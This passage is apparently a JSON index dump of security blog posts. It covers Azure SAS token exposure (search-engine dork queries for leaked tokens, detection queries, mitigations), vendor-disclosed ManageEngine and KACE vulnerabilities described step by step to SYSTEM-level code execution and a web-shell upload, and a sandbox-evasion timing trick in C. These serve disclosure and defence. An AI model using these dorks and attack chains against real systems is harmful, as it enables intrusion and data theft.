\u003cDefaultEncryptionScope\u003e$account-encryption-key\u003c/DefaultEncryptionScope\u003e \u003cDenyEncryptionScopeOverride\u003efalse\u003c/DenyEncryptionScopeOverride\u003e \u003cHasImmutabilityPolicy\u003efalse\u003c/HasImmutabilityPolicy\u003e \u003cHasLegalHold\u003efalse\u003c/HasLegalHold\u003e \u003c/Properties\u003e \u003c/Container\u003e \u003c/Containers\u003e This creates two possible attack vectors for malicious actors to leverage. They are:\nKnowing the storage account name, container name, and whether the container is set to allow anonymous access makes the storage account publicly accessible to anyone. Compromising a SAS token, depending on what permissions the SAS token has, will determine what level of compromise is possible. If the token is granted the list permission (sp=*l*) is granted rt=sco and has not expired, the storage account / service can be fully compromised. Enumerating Storage Accounts and SAS Tokens Services such as greyhat warfare (https://buckets.grayhatwarfare.com/) provide the ability to search through publicly exposed and accessible Azure Storage Accounts. This is important to prevent public access to these blobs and file shares. Ensuring the appropriate SAS token hygiene and application logic is also paramount. Whilst services like greyhat warfare are great for looking into anonymous S3 buckets and storage accounts, this also highlights another potential risk; the disclosure of SAS tokens being cached by various search engines and searching services.\nWe conducted a mapping exercise on Azure Storage Accounts that had over permissive SAS tokens assigned to them:\nDuckDuckGo - 25 +Storage accounts with rwdlacupx Google - 50+ Storage accounts with rwdlacupx Bing - 10 + Storage accounts with rwdlacupx Queries to find SAS tokens are as follows:\nsite:core.windows.net rwdlacup - Looking for Account SAS’s site:core.windows.net inurl:“sp=rl” - Looking for Read / List site:core.windows.net inurl:“sp=rwl” - Looking for Read / Write / List site:core.windows.net inurl:“sr=c” - Looking for Container-level Service SAS tokens Also looking for storage accounts within github code wielded alot of results, most of which pertained to SAS tokens that had not expired due to time, however the account key could have been cycled from within Azure.\nAn attacker could facilitate a compromise of service just by using the exposed SAS token within Google’s search results. A SAS token with update, list, read and write permissions would allow an attacker to pull all files and potentially replace genuine served documentation with malware embedded documents. This in essence could facilitate compromise on the organization’s clients and internal staff. If the file share or blob storage is used for other documentation than static content, access to the client’s environment, and IP could lead to the full compromise of resources or usage as a watering hole for malware serving and deployment.\nFurthermore, after reviewing the github results, its clear organisations are not treating SAS tokens like specific credentials for resources, rather they are forgetting the importance of keeping the token safe.\nDefensive Controls and MitigationsIn order to properly protect against this threat, organisations should start with the implementation of the correct business and application logic, whereby the SAS token is never leaked within the public domain. SAS tokens should be granted granularly and should be treated like API keys, in such they have the correct expiry and permissions set. The correct mitigating controls should be put in place to ensure that SAS tokens are only provisioned with the correct authorisation and once the administrator who is in control of the Storage Accounts, has provided the correct information for doing so. Stored Access Policies A stored access policy can be used to define a set of pre-existing parameters within the SAS token creation process. The policy can be chosen when creating a SAS token to ensure it adheres with the standard defined by policy. The pros of using a Stored Access Policy to create SAS tokens are as follows:\nThey can be defined by an administrator and as such have organisational controls over SAS tokens and their attributes. Misconfigurations of SAS tokens are less likely to occur due to an already defined policy being used to generate them. Revocation and invalidation require just a specific change or deletion of the policy in order to facilitate incident response. From a defenders perspective, its crucial that storage accounts access is logged and monitored, this can be done Azure Monitor, a good reference to that can be found here:\nhttps://docs.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage?tabs=azure-portal\nRevocation and Invalidation Planning If a SAS is leaked, it can be used by anyone who obtains it, which can potentially compromise the storage account as such a method of revocation and invalidation is required as recovery for the instance in which a token is compromised.\nA method of invalidation is required to ensure that the SAS token, like API key or standard credentials can be revoked in real time. Luckily if the SAS token has been generated using the storage account key, in order to revoke the SAS token the administration need just cycle the account key, therefore invalidating the signature of the SAS token. If User-Delegation SAS tokens are compromised, the revoke-delegation-keys command revokes all of the user delegation keys associated with the specified storage account. This revokes all delegation keys that pertain to the storage account and as such renders them useless.\naz storage account revoke-delegation-keys \\ --name \u003cstorage-account\u003e \\ --resource-group \u003cresource-group\u003e Logging and Visibility Defenders can monitor Azure Storage accounts logs for any malicious traffic, that being the use of the comp=list parameter / value within the request. It’s unlikely a valid user who is accessing any publicly facing Storage Account will ever require listing the directories.\nThe following request should be flagged as potentially nefarious, due to the comp=list:\nhttps://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347**?comp=list**\u0026sv=2019-12-12\u0026ss=bfqt\u0026srt=sco\u0026sp=rwdlacupx\u0026se=2020-07-31T03:41:59Z\u0026st=2020-07-30T19:41:59Z\u0026spr=https\u0026sig=REDACTED\nIngestion into Azure Sentinel Organisations for a defence in depth approach should look to be using Azure sentinel and integration to their choses SIEM vendor for a holistic view of the overall defensive stance of the shared storage services. Monitoring should always take place on key assets that contain sensitive data and content.\nTo make detection collaboration easier, Azure sentinel can ingest Azure storage account logs, this allows for defenders to query access logs. Importantly, queries can be run based on Authentication type and Operation name. For instance, an event where the Authentication type was set to anonymous and the Operation name was “Listblobs” should raise concerns. Albeit if you are implementing detection controls on storage account access, this should be the final step on damage control. Prior to this, storage account contents should be vetted to ensure all content present is required to be accessed publicly and without authentication. Example Defensive KQL Queries union StorageBlobLogs | where Uri contains \"jestestc1\"| where OperationName == \"ListBlobs\"| where AuthenticationType == \"Anonymous\" Additional Resources It is important to make sure that when SAS tokens are assigned and created that the appropriate secure metrics are followed, ensuring the principle of least privilege is adhered to. You can find more comprehensive guidance here:\nhttps://docs.microsoft.com/en-us/azure/storage/common/storage-account-overview https://docs.microsoft.com/en-us/azure/storage/common/storage-sas-overview https://docs.microsoft.com/en-us/rest/api/storageservices/create-account-sas https://docs.microsoft.com/en-us/rest/api/storageservices/delegate-access-with-shared-access-signature https://notsosecure.com/identifying-exploiting-leaked-azure-storage-keys/ ","attack-path-analysis#\u003cstrong\u003eAttack Path Analysis\u003c/strong\u003e":"","attack-surface#\u003cstrong\u003eAttack Surface\u003c/strong\u003e":"","background#\u003cstrong\u003eBackground\u003c/strong\u003e":"","client-environment-overview#\u003cstrong\u003eClient Environment\u003c/strong\u003e \u003cstrong\u003eOverview\u003c/strong\u003e":"","defensive-controls-and-mitigations#\u003cstrong\u003eDefensive Controls and Mitigation\u003c/strong\u003es":"","enumerating-storage-accounts-and-sas-tokens#\u003cstrong\u003eEnumerating Storage Accounts and SAS Tokens\u003c/strong\u003e":"","privately-accessible-storage-accounts#\u003cstrong\u003ePrivately Accessible Storage Accounts\u003c/strong\u003e":"","shared-access-tokens-sas#\u003cstrong\u003eShared Access Tokens (SAS)\u003c/strong\u003e ":"","storage-account-overview#\u003cstrong\u003eStorage Account Overview\u003c/strong\u003e":""},"title":"Azure - Securing Shared Access Signatures (SAS)"},"/articles/2022/08/2022-08-02-zoho-manage-engine-desktop-central-sql-injection-arbitrary-file-write/":{"data":{"":"","arbitrary-file-write---query-report#\u003cstrong\u003eArbitrary File Write - Query Report\u003c/strong\u003e":"","summary#\u003cstrong\u003eSummary\u003c/strong\u003e":"","summary-1#\u003cstrong\u003eSummary\u003c/strong\u003e":"Software: Zoho ManageEngine Desktop Central\nAffected Versions: Before 10.0.662\nVendor page: https://www.manageengine.com/products/desktop-central/vulnerabilities-in-reports-module.html\nCVE Reference: CVE-2021-46164\nPublished: 09/01/2022\nCVSS 3.1 Score: 8.8 High\nAttack Vector: SQL Injection / Arbitrary File Write\nCredits: Tom Ellson\nThis is the first post in a two part series on Manage Engine Desktop Central. All of the reported issues have since been acknowledged and resolved by Managed Engine.\nSummary Whilst logged in as a user who has full control over the “reporting” module within Desktop Central, an attacker could directly query the underlying Postgres DB.\nBy default, queries are made by the “dcuser” user. This user is a database administrator and has unrestricted access to all tables and databases within the postgres instance. Therefore, this user can use the built in server side functions lo_import and lo_export to achieve arbitrary file write. Here is some great content on the abuse of lo_import and lo_export.\nlo_import can be used to import any file system both on the server and hosted on an attacker-controlled SMB share via UNC path. Following this, it is possible to use lo_export to write the file anywhere on the system; as the postgres service is running as NT AUTHORITY SYSTEM, the owner property of this file was set to SYSTEM with the highest integrity. This also means that a malicious user is able to write any file on the system to the Desktop Central base directory and could then browse to the web root to retrieve its contents. In order to achieve code execution JUMPSEC observed that when the UEMS.exe service stops or starts it attempts to run the “java.com” executable from the “C:\\program files\\desktopcentral_server\\jre\\bin\\” directory. By default, java.com is not present, meaning that JUMPSEC could write a executable file named java.com to that location and hence it will be executed at the service start time. This file is executed as NT AUTHORITY SYSTEM meaning that code execution is achieved with the highest integrity. Attack Path SQL injection executing the lo_import to import a malicious executable into the large objects on the Postgres DB, and then using lo_export to export them to anywhere on the underlying operating system. Writing the attacker-controlled exe to the “C:\\program files\\desktopcentral_server\\jre\\bin\\” directory as java.com. Waiting for the service to restart. Arbitrary File Write - Query Report It was apparent that the query field was directly querying the database. This was determined by running “SELECT 1” within the query field. From here it was trivial to weaponise. The first step was to enumerate the postgres service and which user was being used to run the queries:\nPost Request to Enumerate The Current User Post Request to Enumerate The Postgres Users The queries were being run as dcuser, who is a superadmin. From here there was multiple avenues that could be explored to extract data from the database, firstly we attempted to take the password hashes from the pg_shadow table:\nPost Request to Enumerate The Hashes from the pgshadow Table This would still require us to be able to crack the hashes or additional steps on the attack path, it’s also likely that the postgres service is limited to localhost.\nUsually in this situation we attempted to create a function in order to execute code. This wasn’t possible due to server side validation ensuring that only SELECT commands could be used within the query. It was apparent that we would have to use the server-side functionality that is built into POSTGRES, and as such lo_import and lo_export were explored.\nlo_import and lo_export seemed a good candidate for being able to read and write files, so we dropped secretfile.txt onto the administrator desktop to attempt to use lo_import to import it into large objects. Post Request using lo_import The response from the query was the OID number of the large object that had been imported. This is important because it will need to be used to identify the large object within the lo_export command.\nThe obvious next step is to write this file to the web root, however there was an issue writing a jsp shell to the web root. JUMPSEC determined this was due to restrictions in the java configuration and no further digging was done.\nOnce arbitrary read / write was confirmed, the attacker was required to know the file name before it can be used with lo_import and moved with lo_export. Next, we analysed what is loaded at service start and stop time to see if this could be abused to execute code leveraging the arbitrary file write. Surprisingly, the service attempted to load the java.com binary at service start and stop time.\nBy placing a binary here and getting the service to stop and start we were able to achieve code execution. But, we still had the problem of being able to load a malicious file into large objects using lo_import.\nIt was apparent that UNC paths could be used to load a malicious file into large objects. If an attacker can host a SMB server on the same network as the MEDC server, we can use lo_import to pull an exe from the SMB server and write it to a location of our choosing. Summary To recap, by this point we had achieved arbitrary file write as NT AUTHORITY SYSTEM, and had identified a binary that was loaded at boot time and whenever the service stops or starts. The j_ava.com_ binary was missing within the default standard build of MEDC.\nWhilst not finding a way to directly trigger the service start and stop using the MEDC portal, it was trivial to cause denial of service (DoS) on the platform by writing the file bcrypt.dll to the postgres bin directory. This completely kills the web portal and instructs an administrator to reboot the service (the service won’t start again until that file has been removed, so this can be incredibly tough for an administrator to unpick). Then once the administrator restarts the service, the java.com binary will be executed as SYSTEM.\nJUMPSEC stopped the attack path here and reported this issue to Managed Engine (Zoho). The issue was quickly addressed by Managed Engine. While the patch does not cover all aspects of this attack chain, it addresses the root cause by removing the dcuser from the superadmins postgres group. Therefore server-side queries cannot be used to load large objects. The service is still running as SYSTEM, the java.com binary is still missing on service start and stop and the bcrypt.dll still kills the entire service."},"title":"(ZOHO) ManageEngine Desktop Central – SQL Injection / Arbitrary File Write"},"/articles/2022/08/2022-08-02-zoho-manageengine-desktop-central-path-traversal-arbitrary-file-write/":{"data":{"":"","attack-path-traversal#\u003cstrong\u003eAttack Path Traversal\u003c/strong\u003e":"","summary#\u003cstrong\u003eSummary\u003c/strong\u003e":"","summary-1#\u003cstrong\u003eSummary\u003c/strong\u003e":"Software: Zoho ManageEngine Desktop Central\nAffected Versions: Before 10.0.662\nVendor page: https://www.manageengine.com/products/desktop-central/vulnerabilities-in-reports-module.html\nCVE Reference: CVE-2021-46165 \u0026 CVE-2021-46166\nPublished: 09/01/2022\nCVSS 3.1 Score: 8.8 High\nAttack Vector: SQL Injection / Arbitrary File Write\nCredits: Tom Ellson\nThis is the second post in our two part series on ManageEngine Desktop Central. All of the reported issues have since been acknowledged and resolved by ManageEngine.\nJUMPSEC researchers have discovered multiple vulnerabilities in ManageEngine Desktop Central Application (MEDC). This is an endpoint management system that is used widely across the globe and is a prevalent vendor. Successful exploitation of these vulnerabilities would allow an adversary to execute code in the context of highest integrity (NT AUTHORITY / SYSTEM).\nIn this second post, we will explore ways of exploiting the issues identified in our previous post, to facilitate attack path traversal leveraging the vulnerabilities identified.\nSummary The application grants users full control over the “Images” and “Deployment” modules within the “OSD Controls”. This allows the user to add an application using the “add applications” control within the admin functionality of the “OS Deployment” tab.\nOnce the user adds the application, the “applicationsName” parameter is vulnerable to a path / directory traversal attack. This in turn allows an attacker or user with malicious intent to upload / write any file to the operating system with the highest integrity as SYSTEM. This can then be leveraged to cause denial of service or code execution as SYSTEM.\nAttack Path Traversal This attack chain begins with a POST request to the files API endpoint. This endpoint takes standard webkitformboundary data. As there are no file upload restrictions, the endpoint can be used to upload all files inclusive of dll’s and exe’s. As seen below, the POST request to the /emsapi/files endpoint allows for an exe file to be uploaded. Upon successful upload the endpoint returns JSON including the fileID, fileName, customerID, expiryDate and fileStatus. Making note of the fileID is important here as it is used in subsequent API requests.\nThe /emsapi/files endpoint can be used to introduce any files to the system. Using this function, we attempted to introduce said files to a location other than the intended directory. The initial attempt at traversal on the files API endpoint was unsuccessful, as the filename parameter does not accept any form of path or directory traversal. This is controlled by file name checks on that parameter which prevents the usage of unicode characters and characters that can be used as a traversal technique.\nThe /emsapi/osdeployer/applications endpoint allows for the user to create a new “application” in the system. Upon creation of an application, a folder is created in the applications directory with the file that was uploaded in the previous API call that corresponds with the fileID.\nThe applicationName is used as a basis to create the application directory folder, meaning traversal and identification of the created folder was trivial; developers often forget input sanitation that would prevent the traversal of the file system in order to create files and folders that should belong to the application directory.\nIf an applicationName is requested that already exists, the application folder will not be created but the file will still be written. Therefore the system32 directory can be used and the system32 folder will not be overwritten, but the file that pertains to the fileID will be uploaded into system32.\nUpon issuing the above API call, the previously uploaded file (tomtest1.exe - fileID 29) is written to the C:\\windows\\system32\\ directory. At this point we had proved arbitrary file write through the application creation endpoint. As per the figure below, the file is being written with the highest file integrity - “NT AUTHORITY\\SYSTEM”. Upon file creation, the java.exe binary creates the file and sets the owner to the local administrator’s group.\nUpon achieving arbitrary file write, it’s important to understand the scope of what can be achieved. Arbitrary File Write (AFW) differs from Arbitrary File Overwrite (AFO). File overwrite is more beneficial to us as we don’t really need to find a binary that is called upon file service execution. However, in this case we had AFW and not AFO, so it was necessary to find an executable or dll that is loaded at run time but was not present on the system. This could be done using first order dll hijacking. However, we opted for an approach similar to what was described here The following Java.com binary is missing from the system at service start time.\nSummary This Arbitrary File Write allows for complete control over the Manage Engine Desktop Central Server as it can be used to execute code.\nWhilst this attack requires some levels of privilege to have been obtained already and access to the application creation functionality. This functionality can be abused to achieve code execution at service start time. This has been reported to the vendor and has been fixed as of the most recent version. The vendor was comprehensive with remediation and quick to respond issues outlined."},"title":"(ZOHO) ManageEngine Desktop Central - Path Traversal / Arbitrary File Write"},"/articles/2022/08/2022-08-11-abusing-shareduserdata-for-defense-evasion-and-exploitation-2/":{"data":{"":"","_ksystem_time-structure#_KSystem_TIME Structure":"Over the past few weeks, I have been working on a custom packer in my spare time. In doing so, I needed to create a method of delaying execution within the unpacker stub that didn’t use any pre-defined functions. This post documents what I discovered during this project as well as some future plans I have for this method.\nWhat is SharedUserData and Why does it exist? _KUSER_SHARED_DATA Structure KSYSTEM_TIME Structure SystemsTime Attribute How can this be abused? Get Epoch Time without Function Calls in C Time Dependent explout development What is SharedUserData and why does it exist? The main purpose of SharedUserData is to provide all windows processes (Windows NT+) with a global and consistent method of obtaining frequently accessed information such as current system time, or interrupt ticks. This is faster than having to incur the performance deficit of making a syscall or calling a function such as RtlTimeToSecondsSince1980.\n_KUSER_SHARED_DATA Structure The KUSER_SHARED_DATA structure defines a data region that the kernel places at a static address for access within user-mode. It is important to note that this region of memory, when accessed via user-mode, is read only. What’s more interesting is that even though this concept could be optimized, the kernel’s execution still begins with a page defined for this data. However, for backwards compatibility reasons, this has not been done and is very unlikely to change in the future.\nThe pre-defined address for access via kernel-mode is defined in wdm.h as KI_USER_SHARED_DATA. When debugging, this is 0xFFDF0000 / 0x00000000FFFFF780 respectively on 32-bit and 64-bit systems. The read-only user-mode address for SharedUserData is 0x7FFE0000, this is static and constant for both 32-bit, and 64-bit Windows systems.\nIt is important to note that this structure has had attributes added over the years, below is an example from Windows XP SP2 (credit), and the following is from my personal machine which is running Windows 10 Build 19043.\n_KUSER_SHARED_DATA Structure Windows XP SP2 0:000\u003e dt _KUSER_SHARED_DATA +0x000 TickCountLow : Uint4B +0x004 TickCountMultiplier : Uint4B +0x008 InterruptTime : _KSYSTEM_TIME +0x014 SystemTime : _KSYSTEM_TIME +0x020 TimeZoneBias : _KSYSTEM_TIME +0x02c ImageNumberLow : Uint2B +0x02e ImageNumberHigh : Uint2B +0x030 NtSystemRoot : [260] Uint2B +0x238 MaxStackTraceDepth : Uint4B +0x23c CryptoExponent : Uint4B +0x240 TimeZoneId : Uint4B +0x244 Reserved2 : [8] Uint4B +0x264 NtProductType : _NT_PRODUCT_TYPE +0x268 ProductTypeIsValid : UChar +0x26c NtMajorVersion : Uint4B +0x270 NtMinorVersion : Uint4B +0x274 ProcessorFeatures : [64] UChar +0x2b4 Reserved1 : Uint4B +0x2b8 Reserved3 : Uint4B +0x2bc TimeSlip : Uint4B +0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE +0x2c8 SystemExpirationDate : _LARGE_INTEGER +0x2d0 SuiteMask : Uint4B +0x2d4 KdDebuggerEnabled : UChar +0x2d5 NXSupportPolicy : UChar +0x2d8 ActiveConsoleId : Uint4B +0x2dc DismountCount : Uint4B +0x2e0 ComPlusPackage : Uint4B +0x2e4 LastSystemRITEventTickCount : Uint4B +0x2e8 NumberOfPhysicalPages : Uint4B +0x2ec SafeBootMode : UChar +0x2f0 TraceLogging : Uint4B +0x2f8 TestRetInstruction : Uint8B +0x300 SystemCall : Uint4B +0x304 SystemCallReturn : Uint4B +0x308 SystemCallPad : [3] Uint8B +0x320 TickCount : _KSYSTEM_TIME +0x320 TickCountQuad : Uint8B +0x330 Cookie : Uint4B _KUSER_SHARED_DATA Structure Windows 10 Build 19043 As you can see, backwards compatibility has been taken into consideration here. This is due to the attributes ranging from 0x000 -\u003e 0x330 are exactly the same, the only difference is that Windows 10 seems to have extra attributes appended to the end of the structure.\n0:000\u003e dt _KUSER_SHARED_DATA ntdll!_KUSER_SHARED_DATA +0x000 TickCountLowDeprecated : Uint4B +0x004 TickCountMultiplier : Uint4B +0x008 InterruptTime : _KSYSTEM_TIME +0x014 SystemTime : _KSYSTEM_TIME +0x020 TimeZoneBias : _KSYSTEM_TIME +0x02c ImageNumberLow : Uint2B +0x02e ImageNumberHigh : Uint2B +0x030 NtSystemRoot : [260] Wchar +0x238 MaxStackTraceDepth : Uint4B +0x23c CryptoExponent : Uint4B +0x240 TimeZoneId : Uint4B +0x244 LargePageMinimum : Uint4B +0x248 AitSamplingValue : Uint4B +0x24c AppCompatFlag : Uint4B +0x250 RNGSeedVersion : Uint8B +0x258 GlobalValidationRunlevel : Uint4B +0x25c TimeZoneBiasStamp : Int4B +0x260 NtBuildNumber : Uint4B +0x264 NtProductType : _NT_PRODUCT_TYPE +0x268 ProductTypeIsValid : UChar +0x269 Reserved0 : [1] UChar +0x26a NativeProcessorArchitecture : Uint2B +0x26c NtMajorVersion : Uint4B +0x270 NtMinorVersion : Uint4B +0x274 ProcessorFeatures : [64] UChar +0x2b4 Reserved1 : Uint4B +0x2b8 Reserved3 : Uint4B +0x2bc TimeSlip : Uint4B +0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE +0x2c4 BootId : Uint4B +0x2c8 SystemExpirationDate : _LARGE_INTEGER +0x2d0 SuiteMask : Uint4B +0x2d4 KdDebuggerEnabled : UChar +0x2d5 MitigationPolicies : UChar +0x2d5 NXSupportPolicy : Pos 0, 2 Bits +0x2d5 SEHValidationPolicy : Pos 2, 2 Bits +0x2d5 CurDirDevicesSkippedForDlls : Pos 4, 2 Bits +0x2d5 Reserved : Pos 6, 2 Bits +0x2d6 CyclesPerYield : Uint2B +0x2d8 ActiveConsoleId : Uint4B +0x2dc DismountCount : Uint4B +0x2e0 ComPlusPackage : Uint4B +0x2e4 LastSystemRITEventTickCount : Uint4B +0x2e8 NumberOfPhysicalPages : Uint4B +0x2ec SafeBootMode : UChar +0x2ed VirtualizationFlags : UChar +0x2ee Reserved12 : [2] UChar +0x2f0 SharedDataFlags : Uint4B +0x2f0 DbgErrorPortPresent : Pos 0, 1 Bit +0x2f0 DbgElevationEnabled : Pos 1, 1 Bit +0x2f0 DbgVirtEnabled : Pos 2, 1 Bit +0x2f0 DbgInstallerDetectEnabled : Pos 3, 1 Bit +0x2f0 DbgLkgEnabled : Pos 4, 1 Bit +0x2f0 DbgDynProcessorEnabled : Pos 5, 1 Bit +0x2f0 DbgConsoleBrokerEnabled : Pos 6, 1 Bit +0x2f0 DbgSecureBootEnabled : Pos 7, 1 Bit +0x2f0 DbgMultiSessionSku : Pos 8, 1 Bit +0x2f0 DbgMultiUsersInSessionSku : Pos 9, 1 Bit +0x2f0 DbgStateSeparationEnabled : Pos 10, 1 Bit +0x2f0 SpareBits : Pos 11, 21 Bits +0x2f4 DataFlagsPad : [1] Uint4B +0x2f8 TestRetInstruction : Uint8B +0x300 QpcFrequency : Int8B +0x308 SystemCall : Uint4B +0x30c Reserved2 : Uint4B +0x310 SystemCallPad : [2] Uint8B +0x320 TickCount : _KSYSTEM_TIME +0x320 TickCountQuad : Uint8B +0x320 ReservedTickCountOverlay : [3] Uint4B +0x32c TickCountPad : [1] Uint4B +0x330 Cookie : Uint4B +0x334 CookiePad : [1] Uint4B +0x338 ConsoleSessionForegroundProcessId : Int8B +0x340 TimeUpdateLock : Uint8B +0x348 BaselineSystemTimeQpc : Uint8B +0x350 BaselineInterruptTimeQpc : Uint8B +0x358 QpcSystemTimeIncrement : Uint8B +0x360 QpcInterruptTimeIncrement : Uint8B +0x368 QpcSystemTimeIncrementShift : UChar +0x369 QpcInterruptTimeIncrementShift : UChar +0x36a UnparkedProcessorCount : Uint2B +0x36c EnclaveFeatureMask : [4] Uint4B +0x37c TelemetryCoverageRound : Uint4B +0x380 UserModeGlobalLogger : [16] Uint2B +0x3a0 ImageFileExecutionOptions : Uint4B +0x3a4 LangGenerationCount : Uint4B +0x3a8 Reserved4 : Uint8B +0x3b0 InterruptTimeBias : Uint8B +0x3b8 QpcBias : Uint8B +0x3c0 ActiveProcessorCount : Uint4B +0x3c4 ActiveGroupCount : UChar +0x3c5 Reserved9 : UChar +0x3c6 QpcData : Uint2B +0x3c6 QpcBypassEnabled : UChar +0x3c7 QpcShift : UChar +0x3c8 TimeZoneBiasEffectiveStart : _LARGE_INTEGER +0x3d0 TimeZoneBiasEffectiveEnd : _LARGE_INTEGER +0x3d8 XState : _XSTATE_CONFIGURATION +0x710 FeatureConfigurationChangeStamp : _KSYSTEM_TIME +0x71c Spare : Uint4B _KSystem_TIME Structure The _KSYSTEM_TIME structure is relatively very simple, however, I figured it would still be useful to give the definition here.\nThe structure (credit) is defined as follows:\ntypedef struct _KSYSTEM_TIME { unsigned long LowPart; long High1Time; long High2Time; } KSYSTEM_TIME, *PKSYSTEM_TIME; ","_kuser_shared_data-structure#_KUSER_SHARED_DATA Structure":"","_kuser_shared_data-structure-windows-10-build-19043#_KUSER_SHARED_DATA Structure Windows 10 Build 19043":"","_kuser_shared_data-structure-windows-xp-sp2#_KUSER_SHARED_DATA Structure Windows XP SP2":"","conclusion#Conclusion":"Whilst this is a fairly simple concept, I figured it would be cool to share as I quite enjoyed the use cases for defense evasion and exploitation purposes.","get-epoch-time-without-function-calls-in-c#Get Epoch Time Without Function Calls in C":"In order to get epoch time (relative to the user’s timezone at least), we first need to get the start of Unix epoch in ticks. I’ve done this for you, it’s 0x019DB1DED53E8000. There really isn’t much to explain here, simply read the values from the SYSTEMTIME attribute of SharedUserData, subtract the unix time start in ticks, and divide to get the level of accuracy you wish for. In this case, I used 100000 as I wanted epoch in seconds.\nunsigned long long __get_timestamp() { const size_t UNIX_TIME_START = 0x019DB1DED53E8000; // Start of Unix epoch in ticks. const size_t TICKS_PER_SECOND = 10000000; // A tick is 100ns. LARGE_INTEGER time; time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14); // Read LowPart as unsigned long. time.HighPart = *(long*)(0x7FFE0000 + 0x1c); // Read High1Part as long. return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND); } This was thrown into a simple PoC, and you can see it working as follows:\nPS C:\\Users\\jorda\\Desktop\\tmp\u003e .\\poc.exe __get_timestamp() -\u003e 1656935008 ","how-can-this-be-abused#How can this be abused?":"This can be abused in a variety of ways, one of which is to use it as an alternative method of sleeping without use of any pre-defined functions. This is beneficial when looking to evade automated defense solutions such as Anti-Virus and EDR’s (Endpoint Detection and Response), reason being modern detection solutions will attempt to skip over, or patch out known sleep or pause methods in order to stop attackers from delaying execution of malicious code within a process. If an attacker is able to pull this off, they can evade most behavioural analysis measures via simply waiting so long that the sandbox closes and assumes the sample is benign.","systemtime-attribute#SystemTime Attribute":"The SystemTime attribute is in my personal opinion one of the most, if not the most useful attribute stored within the _KUSER_SHARED_DATA structure. SystemTime is a 100 nanosecond timer that is measured from Janurary 1st, 1601 of which is stored as a _KSYSTEM_TIME structure (as shown in the above definitions). It is important to note that this timer is affected by the timezone that the machine is using. Something I found interesting is that whilst SYSTEMTIME is 12 bytes in size, only the first 8 matter as High1Time and High2Time are both equal.\nOn all version of Windows NT+, the SystemTime attribute is located at an offset of 0x14 from the beginning (0x7FFE0014).","time-dependent-exploit-development#Time-Dependent exploit development":"Another way this can be abused is when developing exploits. The folk at Uninformed are able to explain this far better than myself, and thus if you want more than a general overview, click here for their post on this.","what-is-shareduserdata-and-why-does-it-exist#What is SharedUserData and why does it exist?":""},"title":"Abusing SharedUserData For Defense Evasion and Exploitation"},"/articles/2022/09/2022-09-08-quest-kace-desktop-authority-pre-auth-remote-code-execution-cve-2021-44031/":{"data":{"":"","attack-analysis#\u003cstrong\u003eAttack Analysis\u003c/strong\u003e":"","exploitation#\u003cstrong\u003eExploitation\u003c/strong\u003e":"","final-thoughts#\u003cstrong\u003eFinal Thoughts\u003c/strong\u003e":"Software: QUEST KACE Desktop Authority\nAffected Versions: 11.1 and earlier.\nVendor page: https://www.quest.com/products/kace-desktop-authority/\nCVE Reference: CVE-2021-44031\nPublished: 19/11/2021\nCVSS 3.1 Score: 9.8 Critical\nAttack Vector: Pre-authenticated Remote Code Execution\nCredits: Tom Ellson\nJUMPSEC recently discovered multiple vulnerabilities in Quest KACE Desktop Authority 11.1. This is an endpoint management system that is used widely across the globe and is prevalent within a wide range of organisations. A pre-auth remote code execution on the KACE Desktop Authority platform exists in which successful exploitation of these vulnerabilities would allow an adversary to achieve remote code execution without first needing to authenticate to the service.\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44031\nhttps://support.quest.com/essentials/vulnerability-reporting-acknowledgements\nhttps://support.quest.com/kace-desktop-authority/kb/336098/quest-response-to-desktop-authority-vulnerabilities-prior-to-11-2\nSummary Due to inadequate authorisation controls, an API endpoint lacking correct authorisation checks allows for an unauthenticated user to upload files. It also does not restrict the file types that can be uploaded, therefore any files can be introduced to the system without proper prevention controls.\nBy default the KACE service uses Windows IIS, meaning that an ASP file can be uploaded using the vulnerable API endpoint. The file is placed in the images directory on the webroot and the asp code is rendered upon browsing to the file resulting on code execution.\nAttack Analysis Within the system, it is possible to upload an image as part of the outlook settings and options within the Desktop Authority console. In an attempt to find machines that can be accessed without authentication, our attention was brought to the dacomponentui directory, this directory by default had directory listing enabled.\nFrom here it was a matter of finding interesting .aspx files as they loaded without authentication being required to the KACE Desktop Authority system. profiles/profileitems/outlooksettings/InsertImage.aspx stood out. The endpoint allows for file upload to what seemed to be the outlook portion of the application, as described before. Further testing was performed on this endpoint and using process monitor we were able to determine the directory to which the files are written to when uploaded using this endpoint. Uploading a file using the InsertImage.aspx endpoint will input the file into the images directory and is placed in a folder with a randomly generated GUID.\nQuerying the following endpoint will provide the opportunity to upload an image as part of the outlook settings and the folder to be placed in the aforementioned images directory.\nAs seen below, it was trivial to upload an ASP file containing code that would render upon accessing the file.\nhttps://{serverIP}/DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage. Following the upload of the file, the GUID is generated and the folder is created in the images directory. The images directory has directory listing on by default.\nIn order to weaponise this, you simply upload a malicious ASP file that allows for code execution. This can be seen below:\nThe flaw with this implementation is threefold. Firstly, the application does not require authentication to access the insertimage.aspx page. The insertimage.aspx page should have a valid users session in order to facilitate access. Secondly, the upload functionality is not checking the file type upon upload, meaning any file type can be introduced into the system through this endpoint. Thirdly, the images directory has directory listing enabled, meaning regardless of the randomly generated GUID, the attacker can still enumerate the directory to which the file is uploaded to. Exploitation Finally, to round this exploit off, I built a python script to automate code execution. The script makes a request to the Desktop Authority service to retrieve the VIEWSTATE.\nOnce the VIEWSTATE is scraped from the service, the script then makes a POST request to upload the file to the insertimage.aspx page. This takes the VIEWSTATE parameter and other webfit boundary items in order to successfully upload the malicious asp file (7c1fe428-4524-4c95-b16d-7711e30563bb.asp) into the images directory. Once the upload has succeeded, a GET request is made to the /images endpoint to enumerate the randomly generated GUIDs that are generated at folder creation time. Following this, another GET request is made to GUID, and another to the file name once the script has enumerated it. One final GET request is made to the uploaded ASPX file and appends the CMD parameter to the request, which instructs the ASPX file to run the supplied data within the CMD parameter. The output is then returned to the user within the CLI.\nFinal Thoughts The vendor responded in a timely fashion and provided updates relating to the fix.","summary#\u003cstrong\u003eSummary\u003c/strong\u003e":""},"title":"QUEST KACE Desktop Authority Pre-Auth Remote 